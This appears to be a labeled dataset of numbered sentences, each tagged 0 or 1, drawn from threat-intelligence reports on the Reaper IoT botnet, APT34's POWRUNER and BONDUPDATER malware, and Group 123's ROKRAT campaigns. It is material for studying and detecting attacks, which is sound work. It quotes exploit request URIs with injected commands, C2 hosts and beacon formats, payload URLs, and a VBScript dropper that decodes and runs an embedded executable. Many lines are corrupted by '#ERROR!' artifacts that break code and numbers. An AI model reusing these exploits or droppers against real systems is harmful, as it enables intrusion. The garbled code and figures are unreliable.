1	Reaper is somewhat loosely based on the Mirai source code, but instead of using a set of admin credentials, the Reaper tries to exploit device HTTP control interfaces.	1
2	It uses a range of vulnerabilities (a total of ten as of this writing), from years 2013-2017.	1
3	All of the vulnerabilities have been fixed by the vendors, but how well are the actual devices updated is another matter.	0
4	According to some reports, we are talking about a ballpark of millions of infected devices.	0
5	In this blogpost, we just wanted to add up some minor details to good reports already published by Netlab 360 [1], CheckPoint [2], Radware [3] and others.	0
6	Execution overview When the Reaper enters device, it does some pretty intense actions in order to disrupt the devices monitoring capabilities.	1
7	For example, it just brutally deletes a folder “/var/log” with “rm -rf”.	1
8	Another action is to disable the Linux watchdog daemon, if present, by sending a specific IOCTL to watchdog device: After the initialization, the Reaper spawns a set of processes for different roles: All the child processes run with a random name, such as “6rtr2aur1qtrb”.	1
9	String obfuscation The Reaper’s spawned child processes use a trivial form of string obfuscation, which is surprisingly effective.	1
10	The main process doesn’t use any obfuscation, but all child processes use this simple scheme when they start executing.	0
11	Basically, it’s a single-byte XOR (0x22), but the way the data is arranged in memory makes it a bit challenging to connect the data to code.	1
12	Main process allocates a table in heap and copies the XOR-encoded data in.	1
13	Later when the child processes want to reference to particular encoded data, it decodes it in heap and references the decoded data with a numeric index.	0
14	After usage, the data is decoded back to its original form.	0
15	The following screenshot is a good presentation of the procedure: Command and Control The Reaper polls periodically a fixed set of C2 servers: weruuoqweiur.com, e.hl852.com, e.ha859.com and 27.102.101.121 The control messages and replies are transmitted over a clear-text HTTP, and the beacons are using the following format: /rx/hx.php?mac=%s%s&type=%s&port=%s&ver=%s&act=%d The protocol is very simple: basically there are only two major functions – shutdown or execute arbitrary payload using the system shell.	1
16	Port scanning One of the child processes starts to scan for vulnerable victims.	0
17	In addition to randomly generated IP addresses, Reaper uses nine hard-coded addresses for some unkown reason.	1
18	The addess is scanned with a set of apparently random-looking set of ports, and then with a set of bit more familiar ports: 80 81 82 83 84 88 1080 3000 3749 8001 8060 8080 8081 8090 8443 8880 10000 In fact, the randomish ports are just byte-swapped presentation of the above port list.	1
19	So for example, 8880 #ERROR!	1
20	0x22b0 turns to 0xb022 #ERROR!	1
21	45090.	1
22	The reason for this is still unknown.	0
23	It is possible that the author was just lazy and left off some endianness handling code, or maybe it is some other error in the programming logic.	0
24	Some of the IoT-devices are big-endian, so the ports need to be swapped in order to use them with socket code.	1
25	Screenshot of the hard-coded list of ports: This is the list of hard-coded IP-addresses: 217.155.58.226 85.229.43.75 213.185.228.42 218.186.0.186 103.56.233.78 103.245.77.113 116.58.254.40 201.242.171.137 36.85.177.3 Exploitation If the Reaper finds promising victim, it next tries to send HTTP-based exploit payload to the target.	1
26	A total of ten different exploits have been observed so far, and they are related to IoT devices HTTP-based control interface.	0
27	Here’s a list of the targeted vulnerabilities and HTTP requests associated with them: 1 – Unauthenticated Remote Command Execution for D-Link DIR-600 and DIR-300 Exploit URI: POST /command.php HTTP/1.1 2 – CVE-2017-8225: exploitation of custom GoAhead HTTP server in several IP cameras GET /system.ini?loginuse&loginpas HTTP/1.1 3 – Exploiting Netgear ReadyNAS Surveillance unauthenticated Remote Command Execution vulnerability GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%%27echo+nuuo+123456;%%27 HTTP/1.1 4 – Exploiting of Vacron NVR through Remote Command Execution GET /board.cgi?cmd=cat%%20/etc/passwd HTTP/1.1 5 – Exploiting an unauthenticated RCE to list user accounts and their clear text passwords on D-Link 850L wireless routers POST /hedwig.cgi HTTP/1.1 6 – Exploiting a Linksys E1500/E2500 vulnerability caused by missing input validation POST /apply.cgi HTTP/1.1 7 – Exploiting of Netgear DGN DSL modems and routers using an unauthenticated Remote Command Execution GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&curpath=/&currentsetting.htm=1cmd=echo+dgn+123456 HTTP/1.1 8 – Exploiting of AVTech IP cameras, DVRs and NVRs through an unauthenticated information leak and authentication bypass GET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.	1

47	New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit « New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | FireEye Inc Search Search FireEye.com Go To give you the best possible experience, this site uses cookies.	1
48	Find out more on how we use cookies.Accept Decline Threat Research New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit December 7 2017 | by Manish Sardiwal, Vincent Cannon, Nalani Fraser, Yogesh Londhe, Nick Richard, Jacqueline O’Leary Middle East APT Less than a week after Microsoft issued a patch for CVE-2017-11882 on Nov. 14 2017 FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East.	1
49	We assess this activity was carried out by a suspected Iranian cyber espionage threat group, whom we refer to as APT34, using a custom PowerShell backdoor to achieve its objectives.	1
50	We believe APT34 is involved in a long-term cyber espionage operation largely focused on reconnaissance efforts to benefit Iranian nation-state interests and has been operational since at least 2014.	1
51	This threat group has conducted broad targeting across a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East.	0
52	We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.	1
53	APT34 uses a mix of public and non-public tools, often conducting spear phishing operations using compromised accounts, sometimes coupled with social engineering tactics.	1
54	In May 2016 we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware.	1
55	We now attribute that campaign to APT34.	1
56	In July 2017 we observed APT34 targeting a Middle East organization using a PowerShell-based backdoor that we call POWRUNER and a downloader with domain generation algorithm functionality that we call BONDUPDATER, based on strings within the malware.	1
57	The backdoor was delivered via a malicious .rtf file that exploited CVE-2017-0199.	1
58	In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER.	1
59	The full report on APT34 is available to our MySIGHT customer community.	1
60	"APT34 loosely aligns with public reporting related to the group ""OilRig""."	1
61	As individual organizations may track adversaries using varied data sets, it is possible that our classifications of activity may not wholly align.	1
62	CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory.	1
63	The vulnerability was patched by Microsoft on Nov. 14 2017.	0
64	A full proof of concept (POC) was publicly released a week later by the reporter of the vulnerability.	0
65	The vulnerability exists in the old Equation Editor (EQNEDT32.EXE), a component of Microsoft Office that is used to insert and evaluate mathematical formulas.	1
66	The Equation Editor is embedded in Office documents using object linking and embedding (OLE) technology.	1
67	It is created as a separate process instead of child process of Office applications.	1
68	If a crafted formula is passed to the Equation Editor, it does not check the data length properly while copying the data, which results in stack memory corruption.	1
69	As the EQNEDT32.exe is compiled using an older compiler and does not support address space layout randomization (ASLR), a technique that guards against the exploitation of memory corruption vulnerabilities, the attacker can easily alter the flow of program execution.	1
70	Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization.	1
71	The malicious file exploits CVE-2017-11882, which corrupts the memory on the stack and then proceeds to push the malicious data to the stack.	1
72	The malware then overwrites the function address with the address of an existing instruction from EQNEDT32.EXE.	1
73	The overwritten instruction (displayed in Figure 1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function.	1
74	Figure 1: Disassembly of overwritten function address After exploitation, the ‘WinExec’ function is successfully called to create a child process, “mshta.exe”, in the context of current logged on user.	1
75	The process “mshta.exe” downloads a malicious script from hxxp://mumbai-m[.]site/b.txt and executes it, as seen in Figure 2.	1
76	Figure 2: Attacker data copied to corrupt stack buffer Execution Workflow The malicious script goes through a series of steps to successfully execute and ultimately establish a connection to the command and control (C2) server.	1
77	The full sequence of events starting with the exploit document is illustrated in Figure 3.	0
78	Figure 3: CVE-2017-11882 and POWRUNER attack sequence Figure 4 contains an excerpt of the v.vbs script pertaining to the Execution Workflow section.	1
79	Figure 4: Execution Workflow Section of v.vbs After successful execution of the steps mentioned in the Execution Workflow section, the Task Scheduler will launch GoogleUpdateschecker.vbs every minute, which in turn executes the dUpdateCheckers.ps1 and hUpdateCheckers.ps1 scripts.	1
80	These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.	1
81	hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server.	1
82	POWRUNER is executed every minute by the Task Scheduler.	1
83	Figure 5 contains an excerpt of the POWRUNER backdoor.	1
84	Figure 5: POWRUNER PowerShell script hUpdateCheckers.ps1 POWRUNER begins by sending a random GET request to the C2 server and waits for a response.	1
85	The server will respond with either “not_now” or a random 11-digit number.	1
86	If the response is a random number, POWRUNER will send another random GET request to the server and store the response in a string.	1
87	POWRUNER will then check the last digit of the stored random number response, interpret the value as a command, and perform an action based on that command.	1
88	The command values and the associated actions are described in Table 1.	0
89	Command Description Action 0 Server response string contains batch commands Execute batch commands and send results back to server 1 Server response string is a file path Check for file path and upload (PUT) the file to server 2 Server response string is a file path Check for file path and download (GET) the file Table 1: POWRUNER commands After successfully executing the command, POWRUNER sends the results back to the C2 server and stops execution.	1
90	The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system.	1
91	POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued.	1
92	Figure 6 shows the PowerShell “Get-Screenshot” function sent by the C2 server.	1
93	Figure 6: Powershell Screenshot Functionality dUpdateCheckers.ps1 (BONDUPDATER) One of the recent advancements by APT34 is the use of DGA to generate subdomains.	1
94	The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server.	1
95	DGA Implementation Figure 7 provides a breakdown of how an example domain (456341921300006B0C8B2CE9C9B007.mumbai-m[.]site) is generated using BONDUPDATER’s custom DGA.	1
96	Figure 7: Breakdown of subdomain created by BONDUPDATER BONDUPDATER will attempt to resolve the resulting DGA domain and will take the following actions based on the IP address resolution: Character Description 0 File contains batch commands, it executes the batch commands 1 Rename the temporary file as .ps1 extension 2 Rename the temporary file as .vbs extension Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER’s DGA implementation.	1
97	Figure 8: Domain Generation Algorithm Some examples of the generated subdomains observed at time of execution include: 143610035BAF04425847B007.mumbai-m[.]site 835710065BAF04425847B007.mumbai-m[.	1

99	]site 376110095BAF04425847B007.mumbai-m[.]site Network Communication Figure 9 shows example network communications between a POWRUNER backdoor client and server.	1
100	Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number -99999999990 as a response.	1
101	As the response is a random number that ends with ‘0’, POWRUNER sends another random GET request to receive an additional command string.	1
102	The C2 server sends back Base64 encoded response.	1
103	If the server had sent the string “not_now” as response, as shown in Figure 10 POWRUNER would have ceased any further requests and terminated its execution.	1
104	"Figure 10: Example ""not now"" server response Batch Commands POWRUNER may also receive batch commands from the C2 server to collect host information from the system."	1
105	This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data.	0
106	An example batch command is provided in Figure 11.	0
107	Figure 11: Batch commands sent by POWRUNER C2 server Additional Use of POWRUNER / BONDUPDATER APT34 has used POWRUNER and BONDUPDATER to target Middle East organizations as early as July 2017.	1
108	In July 2017 a FireEye Web MPS appliance detected and blocked a request to retrieve and install an APT34 POWRUNER / BONDUPDATER downloader file.	1
109	During the same month, FireEye observed APT34 target a separate Middle East organization using a malicious .rtf file (MD5: 63D66D99E46FB93676A4F475A65566D8) that exploited CVE-2017-0199.	1
110	This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc.	1
111	As shown in Figure 12 the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server.	1
112	The file also contains a comment by the malware author that appears to be an apparent taunt to security researchers.	1
113	Figure 12: Contents of dupdatechecker.doc script The dupatechecker.exe file (MD5: C9F16F0BE8C77F0170B9B6CE876ED7FB) drops both BONDUPDATER and POWRUNER.	1
114	These files connect to proxychecker[.]pro for C2.	1
115	Outlook and Implications Recent activity by APT34 demonstrates that they are capable group with potential access to their own development resources.	1
116	During the past few months, APT34 has been able to quickly incorporate exploits for at least two publicly vulnerabilities (CVE-2017-0199 and CVE-2017-11882) to target organizations in the Middle East.	1
117	We assess that APT34’s efforts to continuously update their malware, including the incorporation of DGA for C2, demonstrate the group’s commitment to pursing strategies to deter detection.	1
118	We expect APT34 will continue to evolve their malware and tactics as they continue to pursue access to entities in the Middle East region.	0

135	Talos Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Korea In The Crosshairs Tuesday, January 16 2018 Korea In The Crosshairs This blog post is authored by Warren Mercer and Paul Rascagneres and with contributions from Jungsoo An.	0
136	A one year review of campaigns performed by an actor with multiple campaigns mainly linked to South Korean targets.	0
137	Executive Summary This article exposes the malicious activities of Group 123 during 2017.	1
138	"We assess with high confidence that Group 123 was responsible for the following six campaigns: On January 2nd of 2018 the ""Evil New Year 2018"" was started."	1
139	"This campaign copies the approach of the 2017 ""Evil New Year"" campaign."	1
140	The links between the different campaigns include shared code and compiler artifacts such as PDB (Program DataBase) patterns which were present throughout these campaigns.	1
141	"Based on our analysis, the ""Golden Time"", both ""Evil New Year"" and the ""North Korean Human Rights"" campaigns specifically targeted South Korean users."	1
142	The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite.	1
143	Group 123 has been known to use exploits (such as CVE-2013-0808) or scripting languages harnessing OLE objects.	1
144	The purpose of the malicious documents was to install and to execute ROKRAT, a remote administration tool (RAT).	1
145	On occasion the attackers directly included the ROKRAT payload in the malicious document and during other campaigns the attackers leveraged multi-stage infection processes: the document only contained a downloader designed to download ROKRAT from a compromised web server.	1
146	"Additionally, the ""FreeMilk"" campaign targeted several non-Korean financial institutions."	1
147	In this campaign, the attackers made use of a malicious Microsoft Office document, a deviation from their normal use of Hancom documents.	1
148	This document exploited a newer vulnerability, CVE-2017-0199.	1
149	Group 123 used this vulnerability less than one month after its public disclosure.	1
150	During this campaign, the attackers used 2 different malicious binaries: PoohMilk and Freenki.	1
151	PoohMilk exists only to launch Freenki.	1
152	Freenki is used to gather information about the infected system and to download a subsequent stage payload.	1
153	This malware was used in several campaigns in 2016 and has some code overlap with ROKRAT.	1
154	Finally, we identified a 6th campaign that is also linked to Group 123.	1
155	"We named this 6th campaign ""Are You Happy?""."	1
156	In this campaign, the attackers deployed a disk wiper.	1
157	The purpose of this attack was not only to gain access to the remote infected systems but to also wipe the first sectors of the device.	0
158	We identified that the wiper is a ROKRAT module.	1
159	This actor was very active this year and continued to mainly focus on South Korea.	0
160	The group leveraged spear phishing campaigns and malicious documents the contents of which included very specific language suggesting that they were crafted by native Korean speakers rather than through the use of translation services.	1
161	"The actor has the following demonstrated capabilities: The Timeline Here is the timeline for 2017 and the beginning of 2018: August 2016 to March 2017: ""Golden Time"" Campaign As with the majority of Group 123 campaigns, the initial attack vector during this campaign was spear phishing."	1
162	Talos identified two different kinds of emails.	0
163	The first email we discovered was the most interesting.	0
164	"In this sample, we observed the attackers praising the user for joining a panel related to the ""Korean Reunification and North Korean Conference""."	0
165	The text in the email explained that the recipient should complete the attached document to provide necessary feedback.	0
166	This appears to be a non-existent conference.	0
167	The closest match we identified related to any Unification conference was held in January 2017 which was the NYDA Reunification conference.	0
168	The sender was kgf2016@yonsei.ac.kr' which is the contact email of the Korea Global Forum, a separate conference.	1
169	When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network.	1
170	We believe that the email address was compromised and abused by the attackers to send the email used in this campaign.	0
171	The filename for the malicious attachment translates as Unification North Korea Conference _ Examination Documents' which reinforces the text in the email about the reunification conference.	0
172	For an added bonus, in the body of the email, the attacker even suggests that people who completed the document would get paid a small fee'.	0
173	Perhaps the gift of embedded malware is the payment: Much less effort was used to craft the second email Talos analyzed.	0
174	The email was from a free Korean mail service provided by Daum, Hanmail, indicating that there was no attempt to try to appear as if it originated from an official body or person, unlike the previous email described.	1
175	The subject was simply Request Help' while the attachment filename was I'm a munchon person in Gangwon-do, North Korea'.	0
176	We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.	0
177	A second email contained a story about a person called Ewing Kim' who was looking for help: The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808).	1
178	This vulnerability targets the EPS (Encapsulated PostScript) format.	1
179	The purpose of the shellcode is to download a payload from the Internet.	0
180	The first email displays the following decoy document to the infected user and download the following payload: The second email displays the following decoy document to the infected user and downloads the following payload: In both cases, the downloaded payload is the ROKRAT malware.	1
181	The first tasks of this variant of ROKRAT is to check the operating system version.	1
182	If Windows XP is detected, the malware executes an infinite loop.	0
183	The purpose is to generate empty reports if opened on sandbox systems running Windows XP machines.	0
184	Additionally it checks to determine if common analysis tools are currently running on the infected system.	0
185	If it detects the presence of these tools, the malware performs two network requests to legitimate websites: The Amazon URL displays a WWII game called Men of War' while the Hulu URL attempts to stream a Japanese anime show called Golden Time': One of the identifying characteristics of ROKRAT is the fact that it uses social network and cloud platforms to communicate with the attackers.	1
186	These platforms are used to exfiltrate documents and receive instructions.	0
187	Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire.	0
188	"The tokens for each platform are hardcoded within the sample: November 2016 to January 2017: ""Evil New Year"" Campaign In the early part of 2017 Group123 started the ""Evil New Year"" campaign."	1
189	In this campaign the actors tried to fool victims by pretending the emails were from the Korean Ministry of Unification and that they offered Korean-specific analysis.	0
190	This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments.	1
191	Group123 further attempted to entice victims to open the attachments by using common Hancom Hangul documents.	1
192	Hancom's Hangul is a popular Office Suite used primarily in the Korean peninsula.	0
193	The use of Hangul office documents has the advantage of being the norm for the Korean peninsula.	0
194	If the attacker used Microsoft documents, it may have raised suspicions in the victim.	0
195	Given the regional file format used there is a chance that some security software suites may not handle them well, and this may have provided an evasion case for the attacker.	0
196	"The documents sent to the targets were titled ""Analysis of ""Northern New Year in 2017"" and used the official logo of the Korean Ministry of Unification."	1
197	This is a simple choice for the actor to make, but it further shows their familiarity with the region.	0
198	The document claimed to discuss the New Year's activities of North Korea and this would have been something that the victims in South Korea would be very interested in.	0
199	This would have been particularly TRUE for Government targets, who we believe to be Group123's target of choice.	1
200	This document was a decoy aimed to entice the user to open malicious documents embedded further down the page The actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea.	0
201	"The first link was labeled as ""Comparison of Major Tasks in 16 & 17"" and the second link was identified as ""Comparison between 16 & 17""."	1
202	Upon opening these links the user was presented with a further decoy Hangul document.	1
203	This document was well written and further increases our confidence that we are dealing with a new Korean actor.	0
204	These documents contained malicious OLE objects used to drop binaries.	1
205	This time, however, they contained malicious OLE (Object Link Embedded) objects.	1
206	Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.	1
207	The two dropped binaries were stored and executed in this location during our analysis: Initial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries: The second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process.	1
208	The shellcode is embedded within the resource BIN' and is used to unpack another PE32 binary and use wscript.exe to execute it.	1
209	To do this, Group123 uses a well-known technique that harnesses VirtualAllocEx(), WriteProcessMemory() and CreateRemoteThread() Windows API calls.	1
210	The new PE32 unpacked from the shellcode is an initial reconnaissance malware which is used to communicate with the C2 infrastructure to obtain the final payload.	1
211	The information this malware collected included the following: Group123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase.	1
212	Further network analysis showed that the binary attempted to connect to the following URLs: Korean Government Legal Services (KGLS) is a legitimate Korean government body that manages Korean government legal affairs.	1
213	By compromising the KGLS, the attacker gained a trusted platform from which to execute an attack.	1
214	The initial network connection is to index.php'.	1
215	This connection transmits the information gathered during the reconnaissance phase.	0
216	The attacker uses this information to then determine the specific filename (based on the random ID) to serve to the infected victim.	0
217	"In our case this was 02BC6B26 - this meant a file ""02BC6B26_put.jpg"" was created for us on the attackers C2."	1
218	This file is then dropped and renamed officepatch.exe' on the victim's machine.	1
219	Because the attacker was careful about who they attacked, we were unable to obtain this file during our analysis.	0
220	During our investigation we were able to identify additional Command and Control infrastructure used by this actor.	1
221	Four C2s were observed, based in the following countries: Here is a global map of the identified infrastructure: Contrary to the previous campaign, the attackers separated the reconnaissance phase from the main ROKRAT payload.	1
222	This trick was likely used to avoid detection.	0
223	This is an interesting adaptation in Group 123's behavior.	1
224	"March 2017: ""Are You Happy?"""	1
225	Campaign In March 2017 Group 123 compiled a disk wiper.	1
226	"The malware contains 1 function, the purpose is to open the drive of the infected system (\\.\PhysicalDrive0) and write the following data to the MBR: You can see the ""Are you Happy?"""	1
227	string in the written buffer.	0
228	After writing to the MBR, the malware reboots the machine with the following command: c:\windows\system32\shutdown /r /t 1 After the reboot, the MBR displays the following string to the user: The link to the other campaigns was the following PDB path: As you can see, it perfectly matches the ROKRAT PDB.	1
229	This wiper is a ROKRAT module named ERSP.enc.	1
230	We assume that ERSP means ERaSePartition.	1
231	This module can be downloaded and executed on demand by Group 123.	1
232	"This sample is interesting considering the attack in December 2014 against a Korean power plant where the message that was displayed by the wiper was ""Who Am I?""."	1
233	"May 2017: ""FreeMilk"" Campaign This campaign targeted non-Korean financial institutions, but unlike the other campaigns, this one does not use HWP documents."	1
234	It instead uses Office documents.	1
235	This change is because Group 123 did not target South Korea during this campaign and Microsoft Office is standard in the rest of the world.	1
236	Infection Vectors The attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of Microsoft Office.	1
237	"The URL used can be found in the embedded OLE object: hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data] Here is the source code of the downloaded HTA document: <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""> <html xmlns=""http://www.w3.org/1999/xhtml""> <head> <meta content=""text/html; charset=utf-8"" http-equiv=""Content-Type"" /> <title>Bonjour</title> <script language=""VBScript""> Set owFrClN0giJ #ERROR!"	1

243	The script is used to decode and execute the following payloads: PoohMilk Analysis The PoohMilk sample is designed to perform two actions: The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded.	1
244	"The file is executed with the argument: ""help""."	1
245	Here is the registry creation: The registry location where persistence is achieved is: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update.	1
246	At the next reboot, the malware will be executed.	0
247	"The second action is to check if the file ""wsatra.tmp"" exists in the temporary directory of the current user."	1
248	If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension.	1
249	The LNK file is finally used to identify a third file: a ZIP file.	0
250	The file will be inflated in order to retrieve a RTF document, this document will be displayed to the infected user by executing Wordpad.	1
251	Here is the PDB path from the PoohMilk sample: Freenki Sample The purpose of Freenki is to collect information on the infected system and to download a third executable.	1
252	This sample can be executed with 3 different arguments: The information collected is performed using WMI queries: Additionally the malware lists the running process via the Microsoft Windows API.	1
253	The malware uses obfuscation in order to hide strings such as URL or User-Agent, the algorithm is based on bitwise (SUB 0x0F XOR 0x21), here is the decoded data: The downloaded third payload is obfuscated using the same technique.	1
254	"The file is a fake image starting with ""PNGF""."	1
255	"November 2017: ""North Korean Human Rights"" Campaign In November 2017 Talos observed the latest Group123 campaign of the year, which included a new version of ROKRAT being used in the latest wave of attacks."	1
256	Group 123 again used one of their main calling cards, the malicious HWP document.	1
257	This time, Group 123 used a document containing information in relation to a meeting held on 1st November in Seoul, South Korea.	0
258	"This document was alleged to have been written by a legal representative claiming to be representing the ""Citizens' Alliance For North Korean Human Rights And Reunification Of Korean Peninsula""."	0
259	Group 123 once again uses information related to the Korean unification and now are claiming to highlight concerns related to human rights issues.	0
260	The document brought Talos a new gift - a new version of ROKRAT.	1
261	Following on with the normal Group 123 activity the document was written in perfect Korean text and dialect again suggesting the origin of this group is from the Korean peninsula.	1
262	Further analysis of the document text allowed us to understand the context.	0
263	"The document mentions Community of North Korean human rights and unification' with the lawyer claiming to be part of the ""Citizen's Alliance for North Korean Human Rights and North-South unification""."	1
264	"The main purpose of this document was an attempt to arrange a meeting to discuss items related to ""North Korean Human Rights Act"" and ""Enactment of a Law"" which was passed in 2016 in South Korea."	0
265	We believe that the document was attempting to target stakeholders within the 올인통' community in an attempt to entice them to join the discussion in an attempt to work on additional ideas related to these activities.	1
266	The meeting was due to take place on November 1 2017 and this document was trying to garner additional interest prior to the meeting.	1
267	Once again Group 123 leveraged the use of OLE objects within the HWP document.	1
268	Analysis starts with a zlib decompression (a standard action of HWP documents) and we're able to recover the following script: const strEncode #ERROR!	1
269	"""TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hV[...redacted...]AAAAAAAAAAAAAAAAAAAAAA="" DIM outFile DIM base64Decoded DIM shell_obj SET shell_obj #ERROR!"	1
270	"CreateObject(""WScript.Shell"") DIM fso SET fso #ERROR!"	1
271	"CreateObject(""Scripting.FileSystemObject"") outFile #ERROR!"	1
272	"""c:\ProgramData\HncModuleUpdate.exe"" base64Decoded #ERROR!"	1
273	decodeBase64(strEncode) IF NOT(fso.FileExists(outFile)) then writeBytes outFile, base64Decoded shell_obj.run outFile END IF WScript.Quit() private function decodeBase64(base64) DIM DM, EL SET DM #ERROR!	1
274	"CreateObject(""Microsoft.XMLDOM"") SET EL #ERROR!"	1
275	"DM.createElement(""tmp"") EL.DataType #ERROR!"	1
276	"""bin.base64"" EL.Text #ERROR!"	1
277	base64 decodeBase64 #ERROR!	1
278	EL.NodeTypedValue end function private Sub writeBytes(file, bytes) DIM binaryStream SET binaryStream #ERROR!	1
279	"CreateObject(""ADODB.Stream"") binaryStream.Type #ERROR!"	1
280	1 binaryStream.Open binaryStream.Write bytes binaryStream.SaveToFile file, 1 End Sub This script is executed and is used to decode a static base64 string within the strEncode variable.	1
281	Using base64 encoding the decoded binary is stored as HncModuleUpdate.exe and is then executed.	1
282	This is the ROKRAT dropper.	0
283	Talos suspect the filename may have been selected to make it appear within running processes as a potential Hancom updater.	1
284	The dropper is used to extract a new resource named SBS.	1
285	This specific resource contains malicious shellcode used by the malware.	1
286	Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs.	1
287	The following graph view from IDA shows these steps.	0
288	These execution steps allow the launch of the new ROKRAT variant by decoding the PE binary and injecting into the cmd.exe process.	1
289	One of Group 123 oddities in this campaign was to drop the following picture as a decoy image to the user.	0
290	This image shows various publicly available images which look to be related to the Korean Independence Movement' and appear to be related to the Korean war.	1
291	"We began performing further in-depth analysis on this new version of ROKRAT and this is where we started to notice some similarities with Group 123s ""Evil New Years"" campaign."	1
292	The similitudes are discussed later in this paper.	1
293	This ROKRAT variant contained anti-sandbox techniques.	0
294	This is performed by checking if the following libraries are loaded on the victim machine.	0
295	We were able to uncover some other techniques used by this variant of ROKRAT to make analysis difficult, Group 123 used an anti-debugging technique related to NOP (No Operation).	1
296	nop dword ptr [eax+eax+00h] is a 5 byte NOP.	1
297	"But this opcode is not correctly supported by some debugging tools, Immunity Debugger for example, will replace the assembly by ""???"""	0
298	in red making it difficult to attempt to debug.	1
299	This version of ROKRAT came with a Browser Stealer mechanism which was similar, with a few modifications, to that used in the FreeMilk campaign using Freenki malware in 2016.	1
300	Group 123 continued their use of Cloud platforms with this campaign, this time leveraging pCloud, Dropbox, Box and Yandex.	1
301	"Finally here is the PDB of the sample used during this campaign: January 2018: ""Evil New Year 2018"" Campaign As we observed at the beginning of 2017 Group 123 started a campaign corresponding with the new year in 2018."	1
302	This campaign started on the 2nd of January.	1
303	The infection vector was a malicious HWP document: This decoy document is an analysis of the 2018 New Year speech made by the leader of North Korea.	1
304	The approach is exactly the same as what was seen in 2017 using a new decoy document.	0
305	This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.	1
306	"Similar to the ""Golden Time"" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website: The fake image usage is a common pattern for this group."	1
307	This image contains shellcode used to decode the embedded final payload: ROKRAT.	1
308	This ROKRAT variant is loaded from memory.	1
309	It's a fileless version of ROKRAT.	1
310	This behavior shows that Group 123 is constantly evolving to avoid detection.	1
311	As usual, the ROKRAT sample uses cloud providers to communicate with the operator, this time leveraging Yandex, pCloud, Dropbox and Box.	0
312	Links Between Campaigns Code Sharing Talos has identified that Group 123 shares code between different malware.	0
313	Several features are shared in the samples mentioned in this article; however we will cover only two in this article: the reconnaissance phase and the browsers stealer.	1
314	"Reconnaissance Phase The ROKRAT samples used during the two ""Evil New Year"" and the ""North Korean Human Rights"" campaigns contained a reconnaissance phase."	1
315	"In the ""Evil New Year"" campaign the payload was split into two parts, the first part contained the reconnaissance code."	0
316	In the other campaign the reconnaissance phase was directly included in the main payload.	0
317	This code is the same.	0
318	The malware uses the following registry key to get the machine type: HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData.	1
319	"The ""System manufacturer"" value is used to identify the type of machine."	0
320	The code appears to be based on a forum post (rohitab.com) describing the use of the Win32 APIs used.	1

